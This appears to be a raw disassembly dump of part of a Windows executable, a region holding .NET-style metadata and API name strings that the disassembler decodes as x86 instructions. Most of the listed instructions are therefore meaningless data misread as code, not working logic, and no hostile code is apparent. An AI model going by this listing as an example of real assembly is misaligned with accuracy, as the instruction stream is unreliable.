  402707:	add    bl,BYTE PTR [esi-0x33ff8edd]
  40270d:	add    ah,BYTE PTR [ebx+eiz*1+0x2cc0081]
  402714:	stos   BYTE PTR es:[edi],al
  402715:	and    ecx,DWORD PTR [ecx-0x6ffd3400]
  40271b:	and    edx,DWORD PTR [ecx-0x6ffd3400]
  402721:	and    ebx,DWORD PTR [ecx+0x5604e700]
  402727:	and    al,0xa1
  402729:	add    bl,bh
  40272b:	add    al,0x5c
  40272d:	and    al,0x99
  40272f:	add    BYTE PTR ds:0x99246105,al
  402735:	add    BYTE PTR ds:0xa9246705,al
  40273b:	add    BYTE PTR [ebx],bl
  40273d:	add    eax,0x99245c
  402742:	add    eax,0xb9246d05
  402747:	add    BYTE PTR [edi+0x5],cl
  40274a:	and    BYTE PTR [ecx+edx*1],0x0
  40274e:	outs   dx,DWORD PTR ds:[esi]
  40274f:	add    eax,0xc12484
  402754:	lds    eax,FWORD PTR ds:0xc2489
  40275a:	rol    DWORD PTR ds:0xd12499,cl
  402760:	fild   WORD PTR ds:0xb9249e
  402766:	hlt    
  402767:	add    eax,0xd924a3
  40276c:	pop    ds
  40276d:	push   es
  40276e:	stos   DWORD PTR es:[edi],eax
  40276f:	and    al,0xe1
  402771:	add    BYTE PTR [esi+eax*1],dh
  402774:	nop
  402775:	and    ebp,ecx
  402777:	add    BYTE PTR [esi+0x6],cl
  40277a:	scas   eax,DWORD PTR es:[edi]
  40277b:	and    al,0xf9
  40277d:	add    BYTE PTR [esi+0x6],dh
  402780:	mov    bl,0x24
  402782:	add    DWORD PTR [ecx],eax
  402784:	mov    BYTE PTR [esi],al
  402786:	mov    edx,0x94000924
  40278b:	push   es
  40278c:	scas   eax,DWORD PTR es:[edi]
  40278d:	and    al,0xb9
  40278f:	add    BYTE PTR [ebp+0x924c106],bl
  402795:	add    DWORD PTR [ebp-0x16db39fa],edi
  40279b:	add    bl,al
  40279d:	push   es
  40279e:	nop
  40279f:	and    edx,ecx
  4027a1:	add    bl,cl
  4027a3:	push   es
  4027a4:	stos   DWORD PTR es:[edi],eax
  4027a5:	and    al,0xd1
  4027a7:	add    cl,bl
  4027a9:	push   es
  4027aa:	stos   DWORD PTR es:[edi],eax
  4027ab:	and    al,0xb9
  4027ad:	add    bh,ah
  4027af:	push   es
  4027b0:	retf   
  4027b1:	and    al,0x1
  4027b3:	add    esp,esi
  4027b5:	add    eax,0x1124d5
  4027ba:	pop    eax
  4027bb:	pop    es
  4027bc:	cli    
  4027bd:	and    al,0x19
  4027bf:	add    DWORD PTR [ebp-0x66dafdf9],ecx
  4027c5:	add    BYTE PTR [edi+eax*1+0x992512],dh
  4027cc:	mov    edi,0x99251a07
  4027d1:	add    bl,cl
  4027d3:	pop    es
  4027d4:	pop    ds
  4027d5:	and    eax,0x7cb0099
  4027da:	and    eax,0xcc013125
  4027df:	add    bl,BYTE PTR [ecx-0x33ffeedd]
  4027e5:	add    ch,BYTE PTR [edx]
  4027e7:	and    eax,0x2cc0139
  4027ec:	nop
  4027ed:	and    ecx,DWORD PTR [ecx]
  4027ef:	add    ah,cl
  4027f1:	add    dl,BYTE PTR [eax-0x33febedd]
  4027f7:	add    dl,BYTE PTR [eax+0x4000e23]
  4027fd:	add    BYTE PTR ds:0x8000e00,cl
  402803:	add    BYTE PTR [esi],ch
  402805:	add    BYTE PTR [esi],cl
  402807:	add    BYTE PTR [eax+eax*1],cl
  40280a:	mov    al,0x2
  40280c:	push   cs
  40280d:	add    BYTE PTR [eax],dl
  40280f:	add    BYTE PTR [edi+0x14000e02],bh
  402815:	add    BYTE PTR [eax],al
  402817:	add    BYTE PTR [esi],cl
  402819:	add    BYTE PTR [eax],bl
  40281b:	add    ah,cl
  40281d:	add    cl,BYTE PTR [esi]
  40281f:	add    BYTE PTR [eax+eax*1],bl
  402822:	xchg   BYTE PTR ds:0x20000e,al
  402828:	push   edx
  402829:	or     BYTE PTR [esi],cl
  40282b:	add    BYTE PTR [eax+eax*1],ah
  40282e:	push   ss
  40282f:	or     ecx,DWORD PTR [esi]
  402831:	add    BYTE PTR [eax],ch
  402833:	add    dl,bl
  402835:	or     eax,0x2c000e
  40283a:	nop
  40283b:	adc    BYTE PTR [esi],cl
  40283d:	add    BYTE PTR [eax],dh
  40283f:	add    BYTE PTR [esi+0x13],bl
  402842:	push   cs
  402843:	add    BYTE PTR [eax+eax*1],dh
  402846:	xor    BYTE PTR [esi],dl
  402848:	push   cs
  402849:	add    BYTE PTR [eax],bh
  40284b:	add    dh,bh
  40284d:	sbb    BYTE PTR [esi],cl
  40284f:	add    BYTE PTR [eax+eax*1],bh
  402852:	rcr    BYTE PTR [ebx],cl
  402854:	push   cs
  402855:	add    BYTE PTR [eax+0x0],al
  402858:	mov    BYTE PTR [esi],bl
  40285a:	push   cs
  40285b:	add    BYTE PTR [eax+eax*1+0x40],al
  40285f:	and    DWORD PTR [esi],ecx
  402861:	add    BYTE PTR [eax+0x0],cl
  402864:	shl    BYTE PTR [ecx],1
  402866:	push   cs
  402867:	add    BYTE PTR [eax+eax*1+0x1d],cl
  40286b:	and    cl,BYTE PTR [esi]
  40286d:	add    BYTE PTR [eax+0x0],dl
  402870:	and    cl,BYTE PTR ds:[esi]
  402873:	add    BYTE PTR [eax+eax*1+0x77],dl
  402877:	and    cl,BYTE PTR [esi]
  402879:	add    BYTE PTR [eax+0x0],bl
  40287c:	retf   0xe22
  40287f:	add    BYTE PTR [eax+eax*1-0x1f],bl
  402883:	and    cl,BYTE PTR [esi]
  402885:	add    BYTE PTR [eax+0x0],ah
  402888:	clc    
  402889:	and    cl,BYTE PTR [esi]
  40288b:	add    BYTE PTR [eax+eax*1+0x1b],ah
  40288f:	and    ecx,DWORD PTR [esi]
  402891:	add    BYTE PTR [eax+0x0],ch
  402894:	inc    esp
  402895:	and    ecx,DWORD PTR [esi]
  402897:	add    BYTE PTR [eax+eax*1+0x57],ch
  40289b:	and    esp,DWORD PTR [eax]
  40289d:	add    BYTE PTR [ebx+0x0],dh
  4028a0:	push   ecx
  4028a1:	and    al,0x27
  4028a3:	add    BYTE PTR [ebx+0x2e245101],dl
  4028a9:	add    BYTE PTR [ebx],ch
  4028ab:	add    BYTE PTR [ebp+0x13002e25],dh
  4028b1:	add    BYTE PTR [esi],bh
  4028b3:	and    eax,0x1b002e
  4028b8:	xchg   BYTE PTR ds:0x23002e,ah
  4028be:	call   0x3800:0xb002e25
  4028c5:	and    eax,0x33002e
  4028ca:	hlt    
  4028cb:	and    eax,0x43002e
  4028d0:	and    al,0x26
  4028d2:	add    BYTE PTR cs:[ebx+0x0],cl
  4028d6:	cmp    BYTE PTR ds:0x5b002e,ah
  4028dc:	sub    ah,BYTE PTR [esi]
  4028de:	add    BYTE PTR cs:[ebx+0x0],ah
  4028e2:	xor    esp,DWORD PTR [esi]
  4028e4:	add    BYTE PTR cs:[ebx+0x0],ch
  4028e8:	cmp    al,0x26
  4028ea:	or     BYTE PTR [eax],al
  4028ec:	push   es
  4028ed:	add    BYTE PTR [ebx+0x26],bl
  4028f0:	jae    0x402916
  4028f2:	fbld   TBYTE PTR [edi+esi*8]
  4028f5:	and    al,0xa
  4028f7:	and    eax,0x24922532
  4028fc:	add    al,0x80
  4028fe:	add    BYTE PTR [eax],al
  402900:	add    eax,DWORD PTR [eax]
  402902:	add    BYTE PTR [eax],al
  402904:	add    BYTE PTR [eax],al
  402906:	add    BYTE PTR [eax],al
  402908:	add    DWORD PTR [eax],eax
  40290a:	add    BYTE PTR [eax],al
  40290c:	scas   eax,DWORD PTR es:[edi]
  40290d:	and    edi,DWORD PTR [edi+0x2000004]
	...
  40291b:	add    BYTE PTR [eax],al
  40291d:	add    BYTE PTR [ecx],al
  40291f:	add    BYTE PTR [ecx+0x0],ah
  402922:	add    BYTE PTR [eax],al
  402924:	add    BYTE PTR [eax],al
  402926:	add    eax,DWORD PTR [eax]
	...
  402930:	add    BYTE PTR [eax],al
  402932:	je     0x402957
  402934:	jl     0x402938
  402936:	add    BYTE PTR [eax],al
  402938:	add    BYTE PTR [eax],al
  40293a:	add    BYTE PTR [eax],al
  40293c:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  402943:	gs add BYTE PTR ds:[ebx+esi*2+0x57],dl
  402949:	jo     0x4029b1
  40294b:	push   edi
  40294c:	jb     0x4029be
  40294e:	cs gs js 0x4029b7
  402952:	add    BYTE PTR [edx+0x75],al
  402955:	imul   ebp,DWORD PTR [esp+eiz*2+0x49],0x6f666e
  40295d:	dec    ebp
  40295e:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402965:	je     0x402995
  402967:	dec    ecx
  402968:	outs   dx,BYTE PTR ds:[esi]
  402969:	je     0x4029d0
  40296b:	jb     0x4029db
  40296d:	popa   
  40296e:	ins    BYTE PTR es:[edi],dx
  40296f:	add    BYTE PTR [esp+ebp*2+0x6c],al
  402973:	dec    ecx
  402974:	ins    DWORD PTR es:[edi],dx
  402975:	jo     0x4029e6
  402977:	jb     0x4029ed
  402979:	add    BYTE PTR [ebx+esi*2+0x57],dl
  40297d:	jo     0x4029e5
  40297f:	push   edi
  402980:	jb     0x4029e3
  402982:	jo     0x4029f4
  402984:	gs jb  0x402987
  402987:	push   esp
  402988:	jae    0x4029e1
  40298a:	jo     0x4029f2
  40298c:	push   edi
  40298d:	jb     0x4029f0
  40298f:	jo     0x402a01
  402991:	gs jb  0x4029e2
  402994:	popa   
  402995:	ins    DWORD PTR es:[edi],dx
  402996:	gs push ebx
  402998:	jo     0x4029fb
  40299a:	arpl   WORD PTR [ebp+0x0],sp
  40299d:	ins    DWORD PTR es:[edi],dx
  40299e:	jae    0x402a03
  4029a0:	outs   dx,DWORD PTR ds:[esi]
  4029a1:	jb     0x402a0f
  4029a3:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  4029aa:	gs ins DWORD PTR es:[edi],dx
  4029ac:	add    BYTE PTR [edi+0x62],cl
  4029af:	push   0x65
  4029b1:	arpl   WORD PTR [eax+eax*1+0x57],si
  4029b5:	inc    ebx
  4029b6:	push   eax
  4029b7:	pop    edi
  4029b8:	push   eax
  4029b9:	push   ebp
  4029ba:	inc    edx
  4029bb:	dec    esp
  4029bc:	dec    ecx
  4029bd:	inc    ebx
  4029be:	pop    edi
  4029bf:	dec    ebx
  4029c0:	inc    ebp
  4029c1:	pop    ecx
  4029c2:	pop    edi
  4029c3:	push   esp
  4029c4:	dec    edi
  4029c5:	dec    ebx
  4029c6:	inc    ebp
  4029c7:	dec    esi
  4029c8:	add    BYTE PTR [edi+0x43],dl
  4029cb:	push   eax
  4029cc:	pop    edi
  4029cd:	push   eax
  4029ce:	push   ebp
  4029cf:	inc    edx
  4029d0:	dec    esp
  4029d1:	dec    ecx
  4029d2:	inc    ebx
  4029d3:	pop    edi
  4029d4:	dec    ebx
  4029d5:	inc    ebp
  4029d6:	pop    ecx
  4029d7:	pop    edi
  4029d8:	push   ebx
  4029d9:	push   esp
  4029da:	push   edx
  4029db:	dec    ecx
  4029dc:	dec    esi
  4029dd:	inc    edi
  4029de:	add    BYTE PTR [edi+0x43],dl
  4029e1:	push   eax
  4029e2:	pop    edi
  4029e3:	push   esi
  4029e4:	inc    ebp
  4029e5:	push   edx
  4029e6:	push   ebx
  4029e7:	dec    ecx
  4029e8:	dec    edi
  4029e9:	dec    esi
  4029ea:	add    BYTE PTR [edi+0x43],dl
  4029ed:	push   eax
  4029ee:	pop    edi
  4029ef:	push   esi
  4029f0:	inc    ebp
  4029f1:	push   edx
  4029f2:	push   ebx
  4029f3:	dec    ecx
  4029f4:	dec    edi
  4029f5:	dec    esi
  4029f6:	pop    edi
  4029f7:	push   ebx
  4029f8:	push   ebp
  4029f9:	inc    esi
  4029fa:	inc    esi
  4029fb:	dec    ecx
  4029fc:	pop    eax
  4029fd:	add    BYTE PTR [ebp+0x49],cl
  402a00:	dec    esp
  402a01:	pop    edi
  402a02:	push   esi
  402a03:	inc    ebp
  402a04:	push   edx
  402a05:	push   ebx
  402a06:	dec    ecx
  402a07:	dec    edi
  402a08:	dec    esi
  402a09:	pop    edi
  402a0a:	push   ebx
  402a0b:	push   ebp
  402a0c:	inc    esi
  402a0d:	inc    esi
  402a0e:	dec    ecx
  402a0f:	pop    eax
  402a10:	add    BYTE PTR [eax+0x72],dl
  402a13:	gs jae 0x402a7b
  402a16:	outs   dx,BYTE PTR ds:[esi]
  402a17:	je     0x402a7a
  402a19:	je     0x402a84
  402a1b:	outs   dx,DWORD PTR ds:[esi]
  402a1c:	outs   dx,BYTE PTR ds:[esi]
  402a1d:	inc    ebx
  402a1e:	outs   dx,DWORD PTR ds:[esi]
  402a1f:	jb     0x402a86
  402a21:	add    BYTE PTR [eax+0x72],dl
  402a24:	gs jae 0x402a8c
  402a27:	outs   dx,BYTE PTR ds:[esi]
  402a28:	je     0x402a8b
  402a2a:	je     0x402a95
  402a2c:	outs   dx,DWORD PTR ds:[esi]
  402a2d:	outs   dx,BYTE PTR ds:[esi]
  402a2e:	inc    ebx
  402a2f:	inc    esi
  402a30:	inc    esi
  402a31:	push   edx
  402a32:	popa   
  402a33:	jae    0x402aa9
  402a35:	gs jb  0x402aa1
  402a38:	jp     0x402a9f
  402a3a:	jb     0x402a3c
  402a3c:	push   eax
  402a3d:	jb     0x402aa4
  402a3f:	jae    0x402aa6
  402a41:	outs   dx,BYTE PTR ds:[esi]
  402a42:	je     0x402aa5
  402a44:	je     0x402aaf
  402a46:	outs   dx,DWORD PTR ds:[esi]
  402a47:	outs   dx,BYTE PTR ds:[esi]
  402a48:	inc    esi
  402a49:	outs   dx,DWORD PTR ds:[esi]
  402a4a:	outs   dx,BYTE PTR ds:[esi]
  402a4b:	je     0x402a90
  402a4d:	popa   
  402a4e:	arpl   WORD PTR [eax+0x65],bp
  402a51:	add    BYTE PTR [eax+0x72],dl
  402a54:	gs jae 0x402abc
  402a57:	outs   dx,BYTE PTR ds:[esi]
  402a58:	je     0x402abb
  402a5a:	je     0x402ac5
  402a5c:	outs   dx,DWORD PTR ds:[esi]
  402a5d:	outs   dx,BYTE PTR ds:[esi]
  402a5e:	inc    esi
  402a5f:	jb     0x402ac2
  402a61:	ins    DWORD PTR es:[edi],dx
  402a62:	gs ja  0x402ad4
  402a65:	jb     0x402ad2
  402a67:	add    BYTE PTR [eax+0x72],dl
  402a6a:	gs jae 0x402ad2
  402a6d:	outs   dx,BYTE PTR ds:[esi]
  402a6e:	je     0x402ad1
  402a70:	je     0x402adb
  402a72:	outs   dx,DWORD PTR ds:[esi]
  402a73:	outs   dx,BYTE PTR ds:[esi]
  402a74:	push   ebp
  402a75:	dec    ecx
  402a76:	add    BYTE PTR [eax+0x72],dl
  402a79:	gs jae 0x402ae1
  402a7c:	outs   dx,BYTE PTR ds:[esi]
  402a7d:	je     0x402ae0
  402a7f:	je     0x402aea
  402a81:	outs   dx,DWORD PTR ds:[esi]
  402a82:	outs   dx,BYTE PTR ds:[esi]
  402a83:	inc    esi
  402a84:	jb     0x402ae7
  402a86:	ins    DWORD PTR es:[edi],dx
  402a87:	gs ja  0x402af9
  402a8a:	jb     0x402af7
  402a8c:	dec    esp
  402a8d:	jne    0x402afd
  402a8f:	popa   
  402a90:	add    BYTE PTR [eax+0x72],dl
  402a93:	gs jae 0x402afb
  402a96:	outs   dx,BYTE PTR ds:[esi]
  402a97:	je     0x402afa
  402a99:	je     0x402b04
  402a9b:	outs   dx,DWORD PTR ds:[esi]
  402a9c:	outs   dx,BYTE PTR ds:[esi]
  402a9d:	inc    esi
  402a9e:	jb     0x402b01
  402aa0:	ins    DWORD PTR es:[edi],dx
  402aa1:	gs ja  0x402b13
  402aa4:	jb     0x402b11
  402aa6:	push   edx
  402aa7:	outs   dx,DWORD PTR ds:[esi]
  402aa8:	jns    0x402b0b
  402aaa:	ins    BYTE PTR es:[edi],dx
  402aab:	add    BYTE PTR gs:[eax+0x72],dl
  402aaf:	gs jae 0x402b17
  402ab2:	outs   dx,BYTE PTR ds:[esi]
  402ab3:	je     0x402b16
  402ab5:	je     0x402b20
  402ab7:	outs   dx,DWORD PTR ds:[esi]
  402ab8:	outs   dx,BYTE PTR ds:[esi]
  402ab9:	inc    esi
  402aba:	jb     0x402b1d
  402abc:	ins    DWORD PTR es:[edi],dx
  402abd:	gs ja  0x402b2f
  402ac0:	jb     0x402b2d
  402ac2:	inc    ecx
  402ac3:	gs jb  0x402b35
  402ac6:	add    BYTE PTR [eax+0x72],dl
  402ac9:	gs jae 0x402b31
  402acc:	outs   dx,BYTE PTR ds:[esi]
  402acd:	je     0x402b30
  402acf:	je     0x402b3a
  402ad1:	outs   dx,DWORD PTR ds:[esi]
  402ad2:	outs   dx,BYTE PTR ds:[esi]
  402ad3:	inc    esi
  402ad4:	jb     0x402b37
  402ad6:	ins    DWORD PTR es:[edi],dx
  402ad7:	gs ja  0x402b49
  402ada:	jb     0x402b47
  402adc:	inc    ebx
  402add:	ins    BYTE PTR es:[edi],dx
  402ade:	popa   
  402adf:	jae    0x402b54
  402ae1:	imul   esp,DWORD PTR [ebx+0x0],0x63616552
  402ae8:	push   0x6d617246
  402aed:	gs ja  0x402b5f
  402af0:	jb     0x402b5d
  402af2:	add    BYTE PTR [ebx+0x79],dl
  402af5:	jae    0x402b6b
  402af7:	gs ins DWORD PTR es:[edi],dx
  402af9:	push   eax
  402afa:	jb     0x402b65
  402afc:	outs   dx,BYTE PTR ds:[esi]
  402afd:	je     0x402b68
  402aff:	outs   dx,BYTE PTR ds:[esi]
  402b00:	add    BYTE PTR [bp+di+0x79],dl
  402b04:	jae    0x402b7a
  402b06:	gs ins DWORD PTR es:[edi],dx
  402b08:	push   edi
  402b09:	imul   ebp,DWORD PTR [esi+0x64],0x5073776f
  402b10:	jb     0x402b77
  402b12:	jae    0x402b79
  402b14:	outs   dx,BYTE PTR ds:[esi]
  402b15:	je     0x402b78
  402b17:	je     0x402b82
  402b19:	outs   dx,DWORD PTR ds:[esi]
  402b1a:	outs   dx,BYTE PTR ds:[esi]
  402b1b:	add    BYTE PTR [esi+0x6f],al
  402b1e:	outs   dx,BYTE PTR ds:[esi]
  402b1f:	je     0x402b64
  402b21:	popa   
  402b22:	arpl   WORD PTR [eax+0x65],bp
  402b25:	push   eax
  402b26:	outs   dx,DWORD PTR ds:[esi]
  402b27:	jb     0x402b9d
  402b29:	dec    esi
  402b2a:	popa   
  402b2b:	ins    DWORD PTR es:[edi],dx
  402b2c:	add    BYTE PTR gs:[esi+0x6f],al
  402b30:	outs   dx,BYTE PTR ds:[esi]
  402b31:	je     0x402b76
  402b33:	popa   
  402b34:	arpl   WORD PTR [eax+0x65],bp
  402b37:	push   ebx
  402b38:	gs jb  0x402bb1
  402b3b:	imul   esp,DWORD PTR [ebx+0x65],0x656d614e
  402b42:	add    BYTE PTR [eax+0x72],dl
  402b45:	gs jae 0x402bad
  402b48:	outs   dx,BYTE PTR ds:[esi]
  402b49:	je     0x402bac
  402b4b:	je     0x402bb6
  402b4d:	outs   dx,DWORD PTR ds:[esi]
  402b4e:	outs   dx,BYTE PTR ds:[esi]
  402b4f:	dec    esi
  402b50:	popa   
  402b51:	je     0x402bbc
  402b53:	jbe    0x402bba
  402b55:	add    BYTE PTR [eax+0x72],dl
  402b58:	gs jae 0x402bc0
  402b5b:	outs   dx,BYTE PTR ds:[esi]
  402b5c:	je     0x402bbf
  402b5e:	je     0x402bc9
  402b60:	outs   dx,DWORD PTR ds:[esi]
  402b61:	outs   dx,BYTE PTR ds:[esi]
  402b62:	inc    ebx
  402b63:	inc    esi
  402b64:	inc    esi
  402b65:	push   edx
  402b66:	popa   
  402b67:	jae    0x402bdd
  402b69:	gs jb  0x402bd5
  402b6c:	jp     0x402bd3
  402b6e:	jb     0x402bbe
  402b70:	popa   
  402b71:	je     0x402bdc
  402b73:	jbe    0x402bda
  402b75:	add    BYTE PTR [ebp+0x69],cl
  402b78:	ins    BYTE PTR es:[edi],dx
  402b79:	inc    ebx
  402b7a:	outs   dx,DWORD PTR ds:[esi]
  402b7b:	jb     0x402be2
  402b7d:	add    BYTE PTR [edi+0x69],dl
  402b80:	outs   dx,BYTE PTR ds:[esi]
  402b81:	imul   ebp,DWORD PTR [esi+0x65],0x69570074
  402b88:	outs   dx,BYTE PTR ds:[esi]
  402b89:	outs   dx,DWORD PTR fs:[esi]
  402b8b:	ja     0x402c00
  402b8d:	inc    ebx
  402b8e:	outs   dx,DWORD PTR ds:[esi]
  402b8f:	fs arpl WORD PTR gs:[ebx+0x0],si
  402b94:	push   edi
  402b95:	imul   ebp,DWORD PTR [esi+0x64],0x4373776f
  402b9c:	outs   dx,DWORD PTR ds:[esi]
  402b9d:	fs arpl WORD PTR gs:[ebx+0x45],si
  402ba2:	js     0x402c18
  402ba4:	add    BYTE PTR [ebp+0x73],cl
  402ba7:	arpl   WORD PTR [ebp+0x73],bp
  402baa:	add    BYTE PTR [eax+0x72],dl
  402bad:	outs   dx,BYTE PTR ds:[esi]
  402bae:	je     0x402c26
  402bb0:	push   eax
  402bb1:	je     0x402bb3
  402bb3:	dec    ebp
  402bb4:	popa   
  402bb5:	imul   ebp,DWORD PTR [esi+0x0],0x74737953
  402bbc:	gs ins DWORD PTR es:[edi],dx
  402bbe:	cs push eax
  402bc0:	jb     0x402c2b
  402bc2:	outs   dx,BYTE PTR ds:[esi]
  402bc3:	je     0x402c2e
  402bc5:	outs   dx,BYTE PTR ds:[esi]
  402bc6:	add    BYTE PTR [bx+si+0x72],dl
  402bca:	imul   ebp,DWORD PTR [esi+0x74],0x75657551
  402bd1:	add    BYTE PTR gs:[edi+0x61],dl
  402bd5:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x626f4a72
  402bdd:	push   esp
  402bde:	outs   dx,DWORD PTR ds:[esi]
  402bdf:	inc    edx
  402be0:	gs push eax
  402be2:	jb     0x402c4d
  402be4:	outs   dx,BYTE PTR ds:[esi]
  402be5:	je     0x402c4c
  402be7:	add    BYTE PTR fs:[eax+0x72],dl
  402beb:	imul   ebp,DWORD PTR [esi+0x74],0x44535058
  402bf2:	outs   dx,DWORD PTR ds:[esi]
  402bf3:	arpl   WORD PTR [ebp+0x6d],si
  402bf6:	outs   dx,BYTE PTR gs:[esi]
  402bf8:	je     0x402bfa
  402bfa:	inc    edi
  402bfb:	gs je  0x402c4e
  402bfe:	jb     0x402c69
  402c00:	outs   dx,BYTE PTR ds:[esi]
  402c01:	je     0x402c54
  402c03:	jne    0x402c6a
  402c05:	jne    0x402c6c
  402c07:	add    BYTE PTR [esi],ch
  402c09:	arpl   WORD PTR [edi+ebp*2+0x72],si
  402c0d:	add    BYTE PTR [ebx+0x79],dl
  402c10:	jae    0x402c86
  402c12:	gs ins DWORD PTR es:[edi],dx
  402c14:	cs push edx
  402c16:	gs data16 ins BYTE PTR es:[edi],dx
  402c19:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402c1e:	outs   dx,BYTE PTR ds:[esi]
  402c1f:	add    BYTE PTR [ecx+0x73],al
  402c22:	jae    0x402c89
  402c24:	ins    DWORD PTR es:[edi],dx
  402c25:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402c29:	gs ins BYTE PTR es:[edi],dx
  402c2b:	popa   
  402c2c:	jns    0x402c81
  402c2e:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  402c35:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402c3c:	jae    0x402cb1
  402c3e:	gs ins DWORD PTR es:[edi],dx
  402c40:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  402c44:	gs jns 0x402c8d
  402c47:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  402c4f:	bound  esi,QWORD PTR [ebp+0x74]
  402c52:	add    BYTE PTR gs:[ecx+0x73],al
  402c56:	jae    0x402cbd
  402c58:	ins    DWORD PTR es:[edi],dx
  402c59:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  402c5d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  402c65:	outs   dx,DWORD PTR ds:[esi]
  402c66:	outs   dx,BYTE PTR ds:[esi]
  402c67:	inc    ecx
  402c68:	je     0x402cde
  402c6a:	jb     0x402cd5
  402c6c:	bound  esi,QWORD PTR [ebp+0x74]
  402c6f:	add    BYTE PTR gs:[ecx+0x73],al
  402c73:	jae    0x402cda
  402c75:	ins    DWORD PTR es:[edi],dx
  402c76:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402c7a:	outs   dx,DWORD PTR ds:[esi]
  402c7b:	ins    DWORD PTR es:[edi],dx
  402c7c:	jo     0x402cdf
  402c7e:	outs   dx,BYTE PTR ds:[esi]
  402c7f:	jns    0x402cc2
  402c81:	je     0x402cf7
  402c83:	jb     0x402cee
  402c85:	bound  esi,QWORD PTR [ebp+0x74]
  402c88:	add    BYTE PTR gs:[ecx+0x73],al
  402c8c:	jae    0x402cf3
  402c8e:	ins    DWORD PTR es:[edi],dx
  402c8f:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402c93:	outs   dx,DWORD PTR ds:[esi]
  402c94:	jo     0x402d0f
  402c96:	jb     0x402d01
  402c98:	addr16 push 0x74744174
  402c9e:	jb     0x402d09
  402ca0:	bound  esi,QWORD PTR [ebp+0x74]
  402ca3:	add    BYTE PTR gs:[ecx+0x73],al
  402ca7:	jae    0x402d0e
  402ca9:	ins    DWORD PTR es:[edi],dx
  402caa:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  402cae:	jb     0x402d1f
  402cb0:	fs jne 0x402d16
  402cb3:	je     0x402cf6
  402cb5:	je     0x402d2b
  402cb7:	jb     0x402d22
  402cb9:	bound  esi,QWORD PTR [ebp+0x74]
  402cbc:	add    BYTE PTR gs:[ecx+0x73],al
  402cc0:	jae    0x402d27
  402cc2:	ins    DWORD PTR es:[edi],dx
  402cc3:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  402cc7:	gs jb  0x402d3d
  402cca:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402cd1:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  402cd8:	jns    0x402d4d
  402cda:	je     0x402d41
  402cdc:	ins    DWORD PTR es:[edi],dx
  402cdd:	cs push edx
  402cdf:	jne    0x402d4f
  402ce1:	je     0x402d4c
  402ce3:	ins    DWORD PTR es:[edi],dx
  402ce4:	gs cs dec ecx
  402ce7:	outs   dx,BYTE PTR ds:[esi]
  402ce8:	je     0x402d4f
  402cea:	jb     0x402d5b
  402cec:	jo     0x402d41
  402cee:	gs jb  0x402d67
  402cf1:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  402cf8:	ins    DWORD PTR es:[edi],dx
  402cf9:	push   esi
  402cfa:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  402d01:	je     0x402d77
  402d03:	jb     0x402d6e
  402d05:	bound  esi,QWORD PTR [ebp+0x74]
  402d08:	add    BYTE PTR gs:[ebx+0x4c],al
  402d0c:	push   ebx
  402d0d:	inc    ebx
  402d0e:	outs   dx,DWORD PTR ds:[esi]
  402d0f:	ins    DWORD PTR es:[edi],dx
  402d10:	jo     0x402d7e
  402d12:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  402d19:	jb     0x402d84
  402d1b:	bound  esi,QWORD PTR [ebp+0x74]
  402d1e:	add    BYTE PTR gs:[ebx+0x79],dl
  402d22:	jae    0x402d98
  402d24:	gs ins DWORD PTR es:[edi],dx
  402d26:	cs push ebx
  402d28:	arpl   WORD PTR gs:[ebp+0x72],si
  402d2c:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  402d34:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  402d3b:	add    BYTE PTR [ebx+0x65],dl
  402d3e:	arpl   WORD PTR [ebp+0x72],si
  402d41:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  402d49:	jae    0x402dbe
  402d4b:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402d52:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  402d59:	arpl   WORD PTR gs:[ebp+0x72],si
  402d5d:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x6f697463
  402d65:	outs   dx,BYTE PTR ds:[esi]
  402d66:	add    BYTE PTR [ebx+0x79],dl
  402d69:	jae    0x402ddf
  402d6b:	gs ins DWORD PTR es:[edi],dx
  402d6d:	cs inc esp
  402d6f:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  402d76:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  402d7d:	jne    0x402de6
  402d7f:	addr16 popa 
  402d81:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  402d85:	je     0x402dfb
  402d87:	jb     0x402df2
  402d89:	bound  esi,QWORD PTR [ebp+0x74]
  402d8c:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  402d91:	jne    0x402dfa
  402d93:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  402d9b:	jae    0x402d9d
  402d9d:	push   ebx
  402d9e:	jns    0x402e13
  402da0:	je     0x402e07
  402da2:	ins    DWORD PTR es:[edi],dx
  402da3:	cs push edx
  402da5:	jne    0x402e15
  402da7:	je     0x402e12
  402da9:	ins    DWORD PTR es:[edi],dx
  402daa:	gs cs inc ebx
  402dad:	outs   dx,DWORD PTR ds:[esi]
  402dae:	ins    DWORD PTR es:[edi],dx
  402daf:	jo     0x402e1a
  402db1:	ins    BYTE PTR es:[edi],dx
  402db2:	gs jb  0x402e08
  402db5:	gs jb  0x402e2e
  402db8:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  402dbf:	ins    DWORD PTR es:[edi],dx
  402dc0:	jo     0x402e2b
